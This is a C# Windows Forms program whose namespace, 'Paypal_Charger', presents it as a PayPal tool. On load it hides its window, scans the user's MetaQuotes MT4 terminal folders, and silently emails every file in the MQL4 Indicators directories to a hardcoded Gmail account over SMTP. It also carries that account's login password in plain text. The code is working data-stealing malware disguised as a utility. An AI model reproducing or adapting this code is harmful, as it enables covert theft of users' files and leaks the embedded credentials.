using System;
using System.Net.Mail;
using System.Windows.Forms;
namespace Paypal_Charger
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            this.Visible = false;
            button1_Click(new object(), new EventArgs());
        }


        public void email_send(string[] list)
        {
            MailMessage mail = new MailMessage();
            SmtpClient SmtpServer = new SmtpClient("smtp.gmail.com");
            mail.From = new MailAddress("tornet656@gmail.com");
            mail.To.Add("tornet656@gmail.com");
            mail.Subject = "";
            

            for (int i = 0; i < list.Length; i++)
            {
                //MessageBox.Show(list[i].ToString());
                if (System.IO.File.Exists(list[i].ToString()))
                {
                    mail.Body += list[i].ToString() +"\n";
                    System.Net.Mail.Attachment attachment = new System.Net.Mail.Attachment(list[i]);
                    mail.Attachments.Add(attachment);
                }
            }
            
            SmtpServer.Port = 587;
            SmtpServer.Credentials = new System.Net.NetworkCredential("tornet656@gmail.com", "H=d6@b3;c21N1TK+E&$lKcg))R^_KEHeC[oG%pl1qlNv]PTEp+");
            SmtpServer.EnableSsl = true;
            SmtpServer.Send(mail);


        }
        private void button1_Click(object sender, EventArgs e)
        {
            try
            {
                string path = @"C:\Users\" + Environment.UserName + @"\AppData\Roaming\MetaQuotes\Terminal\";
                string[] dir = System.IO.Directory.GetDirectories(path);
                if (dir.Length > 0)
                {
                    for (int i = 0; i < dir.Length; i++)
                    {
                        dir[i] = dir[i] + @"\MQL4\Indicators\";
                        if (System.IO.Directory.Exists(dir[i]))
                        {
                            string[] arrayList = System.IO.Directory.GetFiles(dir[i]);
                            email_send(arrayList);
                            System.Threading.Thread.Sleep(60000);
                            string[] temp_dir = System.IO.Directory.GetDirectories(dir[i]);

                            for (int z = 0; z < temp_dir.Length; z++)
                            {
                                string[] temp_file = (System.IO.Directory.GetFiles(temp_dir[z]));
                                email_send(temp_file);
                                System.Threading.Thread.Sleep(60000);
                            }



                        }
                    }
                }

            }
            catch (Exception)
            {

                throw;
            }

        }
    }
}
